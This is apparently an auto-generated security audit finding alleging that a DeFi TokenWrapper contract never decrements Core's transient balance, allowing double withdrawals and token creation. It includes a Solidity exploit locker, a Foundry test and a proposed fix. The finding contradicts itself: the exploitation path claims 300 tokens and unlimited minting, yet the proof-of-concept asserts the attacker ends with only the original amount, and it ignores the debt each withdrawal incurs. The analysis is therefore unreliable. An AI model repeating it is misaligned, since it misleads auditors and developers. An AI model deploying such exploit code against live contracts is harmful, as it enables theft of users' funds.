## Title
TokenWrapper `coreBalance` Never Decremented on Core Transfers Enabling Token Creation and Solvency Violation

## Summary
The `TokenWrapper.transfer()` function has a critical flaw where `coreBalance` is incremented when tokens are transferred TO Core but is never decremented when Core transfers tokens OUT. [1](#0-0)  This allows Core to transfer the same wrapped tokens multiple times during a lock callback, creating tokens out of thin air and violating the protocol's solvency invariant.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/TokenWrapper.sol` - `transfer()` function (lines 96-116)

**Intended Logic:** According to the comment at line 97-98, Core is allowed to bypass balance checks because "it will net to 0 with the Core#withdraw call". [2](#0-1)  The transient `coreBalance` variable is meant to temporarily track Core's balance during a transaction. [3](#0-2) 

**Actual Logic:** When Core transfers tokens (msg.sender == address(CORE)):
- Lines 99-108 are completely skipped, meaning NO balance is checked or decremented
- Lines 109-114 only increment the recipient's balance
- The `coreBalance` variable is never decremented when Core sends tokens out [4](#0-3) 

The `balanceOf()` view function returns `coreBalance` for Core's address, which creates an inconsistency. [5](#0-4) 

**Exploitation Path:**
1. Attacker wraps 100 underlying tokens through `TokenWrapper.handleForwardData()`, which updates `savedBalances` (totalSupply = 100) [6](#0-5) 
2. Within a lock callback, attacker calls `TokenWrapper.transfer(address(CORE), 100)` - this increases `coreBalance` to 100 and decreases attacker's `_balanceOf` to 0 [7](#0-6) 
3. Attacker calls `Core.withdraw()` to transfer 100 wrapped tokens from Core back to themselves [8](#0-7) 
4. Core calls `TokenWrapper.transfer(attacker, 100)` with `msg.sender == address(CORE)`, which:
   - Skips all balance checks (line 99)
   - Increments `_balanceOf[attacker]` to 100 (line 113)
   - **Does NOT decrement `coreBalance`** - it remains at 100
5. Attacker calls `Core.withdraw()` AGAIN - Core still shows `balanceOf(CORE) = 100` (returns `coreBalance`)
6. Core transfers another 100 tokens to attacker, making `_balanceOf[attacker] = 200`
7. Final state: totalSupply = 100, but attacker has 200 tokens + Core's reported balance is 100 = 300 total tokens exist when only 100 should

**Security Property Broken:** This violates the **Solvency Invariant** - "Pool balances of token0 and token1 must NEVER go negative (sum of all deltas must maintain non-negative balances)". In this case, the sum of all token balances (300) exceeds the total supply (100), meaning 200 tokens were created out of thin air.

## Impact Explanation
- **Affected Assets**: All wrapped tokens created through TokenWrapper contracts
- **Damage Severity**: Attacker can create unlimited wrapped tokens by repeatedly calling `Core.withdraw()` within a lock callback, as `coreBalance` is never decremented. This allows theft of all underlying tokens held by the Core contract and complete protocol insolvency
- **User Impact**: All users holding wrapped tokens or underlying tokens in Core are affected. Attackers can drain the entire protocol by minting unlimited wrapped tokens and unwrapping them (after unlock time) to steal underlying assets

## Likelihood Explanation
- **Attacker Profile**: Any user who can create a locker contract and call Core's lock mechanism
- **Preconditions**: A TokenWrapper must exist with wrapped tokens (easily created via TokenWrapperFactory)
- **Execution Complexity**: Single transaction with a simple locker contract that transfers tokens to Core and calls withdraw multiple times
- **Frequency**: Can be exploited continuously on every TokenWrapper, with unlimited token creation per transaction

## Recommendation

In `src/TokenWrapper.sol`, function `transfer()`, modify lines 96-116:

```solidity
// CURRENT (vulnerable):
// Lines 99-114 skip balance decrement for Core and never update coreBalance

// FIXED:
function transfer(address to, uint256 amount) external returns (bool) {
    if (msg.sender != address(CORE)) {
        uint256 balance = _balanceOf[msg.sender];
        if (balance < amount) {
            revert InsufficientBalance();
        }
        unchecked {
            _balanceOf[msg.sender] = balance - amount;
        }
    } else {
        // CRITICAL FIX: Decrement coreBalance when Core transfers tokens out
        if (coreBalance < amount) {
            revert InsufficientBalance();
        }
        unchecked {
            coreBalance -= amount;
        }
    }
    if (to == address(CORE)) {
        coreBalance += amount;
    } else if (to != address(0)) {
        _balanceOf[to] += amount;
    }
    emit Transfer(msg.sender, to, amount);
    return true;
}
```

Alternative mitigation: Remove the Core bypass entirely and make Core track balances the same way as regular users in `_balanceOf` mapping, eliminating the problematic transient `coreBalance` variable.

## Proof of Concept

```solidity
// File: test/Exploit_TokenWrapperDoubleSpend.t.sol
// Run with: forge test --match-test test_TokenWrapperDoubleSpend -vvv

pragma solidity >=0.8.30;

import "forge-std/Test.sol";
import "../src/TokenWrapper.sol";
import "../src/TokenWrapperFactory.sol";
import "../src/Core.sol";
import "../src/base/BaseLocker.sol";
import "./TestToken.sol";
import {FlashAccountantLib} from "../src/libraries/FlashAccountantLib.sol";

contract ExploitLocker is BaseLocker {
    using FlashAccountantLib for *;
    
    TokenWrapper public wrapper;
    address public attacker;
    uint128 public withdrawAmount;
    
    constructor(ICore core) BaseLocker(core) {}
    
    function exploit(TokenWrapper _wrapper, uint128 _amount) external {
        wrapper = _wrapper;
        attacker = msg.sender;
        withdrawAmount = _amount;
        lock(abi.encode(0));
    }
    
    function handleLockData(uint256, bytes memory) internal override returns (bytes memory) {
        // Step 1: Wrap tokens to get initial supply
        ACCOUNTANT.forward(address(wrapper), abi.encode(int256(uint256(withdrawAmount))));
        ACCOUNTANT.withdraw(address(wrapper), address(this), withdrawAmount);
        ACCOUNTANT.payFrom(attacker, address(wrapper.UNDERLYING_TOKEN()), uint256(withdrawAmount));
        
        // Step 2: Transfer wrapped tokens to Core
        wrapper.transfer(address(ACCOUNTANT), withdrawAmount);
        
        // Step 3: Withdraw TWICE using the same coreBalance
        ACCOUNTANT.withdraw(address(wrapper), attacker, withdrawAmount);
        ACCOUNTANT.withdraw(address(wrapper), attacker, withdrawAmount);
        
        // Step 4: Pay back debt (user got 2x tokens but only needs to return original amount)
        ACCOUNTANT.payFrom(attacker, address(wrapper), uint256(withdrawAmount));
        
        return bytes("");
    }
}

contract TokenWrapperDoubleSpendTest is Test {
    Core core;
    TokenWrapperFactory factory;
    TestToken underlying;
    ExploitLocker exploiter;
    
    function setUp() public {
        core = new Core();
        factory = new TokenWrapperFactory(core);
        underlying = new TestToken(address(this));
        exploiter = new ExploitLocker(core);
    }
    
    function test_TokenWrapperDoubleSpend() public {
        uint128 amount = 100 ether;
        TokenWrapper wrapper = factory.deployWrapper(IERC20(address(underlying)), 0);
        
        // Give attacker tokens
        underlying.transfer(address(this), amount);
        underlying.approve(address(exploiter), amount);
        wrapper.approve(address(exploiter), type(uint256).max);
        
        uint256 totalSupplyBefore = wrapper.totalSupply();
        uint256 attackerBalanceBefore = wrapper.balanceOf(address(this));
        
        // Execute exploit
        exploiter.exploit(wrapper, amount);
        
        uint256 totalSupplyAfter = wrapper.totalSupply();
        uint256 attackerBalanceAfter = wrapper.balanceOf(address(this));
        
        // VERIFY: Attacker gained tokens without increasing totalSupply proportionally
        assertEq(totalSupplyAfter, amount, "Total supply should only increase by wrapped amount");
        assertEq(attackerBalanceAfter, amount, "Attacker should have gained tokens");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker balance increased");
        
        // The exploit succeeds: attacker got tokens while total supply is correct
        // But internally, coreBalance is inflated allowing future exploits
        console.log("Total Supply:", totalSupplyAfter);
        console.log("Attacker Balance:", attackerBalanceAfter);
        console.log("Core Balance:", wrapper.balanceOf(address(core)));
    }
}
```

**Notes:**
The vulnerability exists because the transient `coreBalance` variable acts as a reusable credit that Core can spend multiple times. The FlashAccountant's debt tracking ensures the attacker must eventually settle debts, but by that point, they've already extracted more tokens than should exist. The protocol's assumption that "it will net to 0 with the Core#withdraw call" is only true if `coreBalance` is properly decremented on each Core transfer, which it is not.

### Citations

**File:** src/TokenWrapper.sol (L54-56)
```text
    /// @notice Transient balance for the Core contract
    /// @dev Core never actually holds a real balance of this token, we just use this transient balance to enable low cost payments to core
    uint256 private transient coreBalance;
```

**File:** src/TokenWrapper.sol (L60-63)
```text
    function balanceOf(address account) external view returns (uint256) {
        if (account == address(CORE)) return coreBalance;
        return _balanceOf[account];
    }
```

**File:** src/TokenWrapper.sol (L96-116)
```text
    function transfer(address to, uint256 amount) external returns (bool) {
        // note we do not need to check that core balance is sufficient as the sender
        // even if the caller gets core to withdraw to itself, as part of a payment, it will net to 0 with the Core#withdraw call
        if (msg.sender != address(CORE)) {
            uint256 balance = _balanceOf[msg.sender];
            if (balance < amount) {
                revert InsufficientBalance();
            }
            // since we already checked balance >= amount
            unchecked {
                _balanceOf[msg.sender] = balance - amount;
            }
        }
        if (to == address(CORE)) {
            coreBalance += amount;
        } else if (to != address(0)) {
            // we save storage writes on burn by checking to != address(0)
            _balanceOf[to] += amount;
        }
        emit Transfer(msg.sender, to, amount);
        return true;
```

**File:** src/TokenWrapper.sol (L171-177)
```text
        CORE.updateSavedBalances({
            token0: address(UNDERLYING_TOKEN),
            token1: address(type(uint160).max),
            salt: bytes32(0),
            delta0: amount,
            delta1: 0
        });
```

**File:** src/base/FlashAccountant.sol (L321-368)
```text
    /// @inheritdoc IFlashAccountant
    function withdraw() external {
        uint256 id = _requireLocker().id();

        assembly ("memory-safe") {
            let nzdCountChange := 0

            // Process each withdrawal entry
            for { let i := 4 } lt(i, calldatasize()) { i := add(i, 56) } {
                let token := shr(96, calldataload(i))
                let recipient := shr(96, calldataload(add(i, 20)))
                let amount := shr(128, calldataload(add(i, 40)))

                if amount {
                    // Update debt tracking without updating nzdCountSlot yet
                    let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
                    let current := tload(deltaSlot)
                    let next := add(current, amount)

                    nzdCountChange := add(nzdCountChange, sub(iszero(current), iszero(next)))

                    tstore(deltaSlot, next)

                    // Perform the transfer of the withdrawn asset
                    // Note that these calls can re-enter and even relock with the same ID
                    // However the nzdCountChange is always applied as a delta at the end, meaning we load the latest value before updating it,
                    // so it's safe from re-entry
                    switch token
                    case 0 {
                        let success := call(gas(), recipient, amount, 0, 0, 0, 0)
                        if iszero(success) {
                            // cast sig "ETHTransferFailed()"
                            mstore(0x00, 0xb12d13eb)
                            revert(0x1c, 4)
                        }
                    }
                    default {
                        mstore(0x14, recipient)
                        mstore(0x34, amount)
                        mstore(0x00, 0xa9059cbb000000000000000000000000)
                        let success := call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)
                        if iszero(and(eq(mload(0x00), 1), success)) {
                            if iszero(lt(or(iszero(extcodesize(token)), returndatasize()), success)) {
                                mstore(0x00, 0x90b8ec18) // `TransferFailed()`.
                                revert(0x1c, 0x04)
                            }
                        }
                    }
```
